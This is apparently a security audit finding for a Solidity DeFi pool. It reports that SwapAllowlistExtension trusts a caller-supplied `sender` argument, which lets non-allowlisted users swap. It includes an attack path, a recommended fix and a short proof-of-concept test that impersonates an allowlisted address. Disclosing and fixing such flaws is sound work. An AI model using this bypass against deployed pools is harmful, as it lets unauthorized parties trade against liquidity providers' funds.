### Title
`SwapAllowlistExtension` Allowlist Bypassed via Caller-Controlled `sender` Argument — (`metric-periphery/contracts/extensions/SwapAllowlistExtension.sol`)

---

### Summary

`SwapAllowlistExtension.beforeSwap` gates swaps by checking the `sender` argument passed to it by the pool. Because the pool's `swap` function accepts `sender` as an explicit caller-supplied parameter and the pool uses a callback pattern (not `msg.sender`) for token settlement, any unprivileged caller can pass an allowlisted address as `sender`, satisfy the allowlist check, and execute a swap — even though they are not on the allowlist.

---

### Finding Description

`SwapAllowlistExtension.beforeSwap` enforces access control by checking:

```solidity
if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
    revert IMetricOmmPoolActions.NotAllowedToSwap();
}
``` [1](#0-0) 

Here `msg.sender` is the pool (the extension is called by the pool), and `sender` is the first argument forwarded by the pool through `ExtensionCalling._beforeSwap`:

```solidity
function _beforeSwap(
    address sender,
    address recipient,
    ...
) internal {
    _callExtensionsInOrder(
      BEFORE_SWAP_ORDER,
      abi.encodeCall(IMetricOmmExtensions.beforeSwap, (sender, ...))
    );
}
``` [2](#0-1) 

The pool's `swap` function accepts `sender` as an explicit caller-supplied parameter (confirmed by test calls such as `pool.simulateSwapAndRevert(users[0], ...)` and `_swap(0, users[0], ...)`). [3](#0-2) 

The pool settles token transfers via a callback to `msg.sender` (the `IMetricOmmSwapCallback` pattern shown in the wiki's swap lifecycle), not by pulling from `sender`. There is no on-chain check that `msg.sender == sender`.

**Attack path:**

1. Pool admin deploys a pool with `SwapAllowlistExtension` configured in `BEFORE_SWAP_ORDER`, allowlisting only specific addresses (e.g., `alice`).
2. Attacker (not allowlisted) calls `pool.swap(alice, recipient, zeroForOne, amount, priceLimit, bid, ask, extensionData)` directly, supplying `alice` as `sender`.
3. The pool calls `_beforeSwap(alice, ...)`, which calls `SwapAllowlistExtension.beforeSwap` with `sender = alice`.
4. The allowlist check `allowedSwapper[pool][alice]` passes.
5. The pool executes the swap math and calls back to `msg.sender` (the attacker) via `IMetricOmmSwapCallback` to collect input tokens.
6. The attacker provides tokens, receives output, and the swap settles — despite never being on the allowlist.

The same structural issue applies to router-mediated swaps: when `MetricOmmSimpleRouter` calls `pool.swap(...)`, the `sender` it supplies determines what the allowlist checks, creating a mismatch between the economically relevant actor and the gated identity. [4](#0-3) 

---

### Impact Explanation

The swap allowlist is the primary access-control mechanism for restricting who may trade against a pool. A complete bypass means:

- Any unprivileged address can swap on a pool intended to be private or restricted (e.g., institutional, KYC-gated, or whitelist-only pools).
- LP funds are exposed to unrestricted counterparties, violating the pool admin's configured invariant.
- Protocol fees accrue from unauthorized swaps, but LP positions are exposed to adverse selection from actors the pool was explicitly designed to exclude.

This is an **admin-boundary break**: the pool admin's configured allowlist is bypassed by an unprivileged direct pool call, with direct fund-impacting consequences for LPs.

---

### Likelihood Explanation

- The pool's `swap` function is public and callable by anyone.
- No special privilege, flash loan, or multi-step setup is required — a single direct call suffices.
- The attacker only needs to know one allowlisted address (observable on-chain via `AllowedToSwapSet` events or `allowedSwapper` mapping reads).
- The bypass is reachable on any pool that has `SwapAllowlistExtension` in its `BEFORE_SWAP_ORDER` and is not using `allowAllSwappers`.

---

### Recommendation

The pool must bind `sender` to `msg.sender` at the `swap` entry point, or the extension must verify `sender == msg.sender` (i.e., the actual caller of the pool). Concretely:

1. **In the pool's `swap` function**: derive `sender` as `msg.sender` internally rather than accepting it as a caller-supplied parameter, or add a `require(msg.sender == sender)` guard before dispatching to extensions.
2. **In `SwapAllowlistExtension.beforeSwap`**: as a defense-in-depth measure, reject calls where `sender` cannot be verified to be the actual economic actor (though the root fix must be in the pool).

---

### Proof of Concept

```solidity
// Setup: pool with SwapAllowlistExtension, only `alice` is allowlisted
swapAllowlist.setAllowedToSwap(address(pool), alice, true);

// Attacker is NOT allowlisted
address attacker = makeAddr("attacker");
token0.mint(attacker, 10_000);
vm.startPrank(attacker);
token0.approve(address(pool), 10_000);

// Attacker calls pool.swap() directly, supplying alice as sender
// Pool calls _beforeSwap(alice, ...) → allowlist check passes for alice
// Pool calls back to msg.sender (attacker) via IMetricOmmSwapCallback
// Attacker implements callback, provides tokens, receives output
pool.swap(
    alice,        // sender — allowlisted, but attacker is the real caller
    attacker,     // recipient — attacker receives output
    false,        // zeroForOne
    int128(1000),
    type(uint128).max,
    bid, ask,
    bytes("")
);
// Swap execeds despite attacker not being on the allowlist
vm.stopPrank();
``` [1](#0-0) [5](#0-4) [6](#0-5)

### Citations

**File:** metric-periphery/contracts/extensions/SwapAllowlistExtension.sol (L12-13)
```text
  mapping(address pool => mapping(address swapper => bool)) public allowedSwapper;
  mapping(address pool => bool) public allowAllSwappers;
```

**File:** metric-periphery/contracts/extensions/SwapAllowlistExtension.sol (L31-41)
```text
  function beforeSwap(address sender, address, bool, int128, uint128, uint256, uint128, uint128, bytes calldata)
    external
    view
    override
    returns (bytes4)
  {
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
      revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
    return IMetricOmmExtensions.beforeSwap.selector;
  }
```

**File:** metric-core/contracts/ExtensionCalling.sol (L149-177)
```text
  function _beforeSwap(
    address sender,
    address recipient,
    bool zeroForOne,
    int128 amountSpecified,
    uint128 priceLimitX64,
    uint256 packedSlot0Initial,
    uint128 bidPriceX64,
    uint128 askPriceX64,
    bytes calldata extensionData
  ) internal {
    _callExtensionsInOrder(
      BEFORE_SWAP_ORDER,
      abi.encodeCall(
        IMetricOmmExtensions.beforeSwap,
        (
          sender,
          recipient,
          zeroForOne,
          amountSpecified,
          priceLimitX64,
          packedSlot0Initial,
          bidPriceX64,
          askPriceX64,
          extensionData
        )
      )
    );
  }
```

**File:** metric-core/test/MetricOmmPool.extensions.t.sol (L121-123)
```text
    pool.simulateSwapAndRevert(
      users[0], false, int128(1000), type(uint128).max, uint128(2 ** 64), uint128(2 ** 64 + 1), bytes("")
    );
```

**File:** metric-core/contracts/interfaces/extensions/IMetricOmmExtensions.sol (L50-60)
```text
  function beforeSwap(
    address sender,
    address recipient,
    bool zeroForOne,
    int128 amountSpecified,
    uint128 priceLimitX64,
    uint256 packedSlot0Initial,
    uint128 bidPriceX64,
    uint128 askPriceX64,
    bytes calldata extensionData
  ) external returns (bytes4);
```
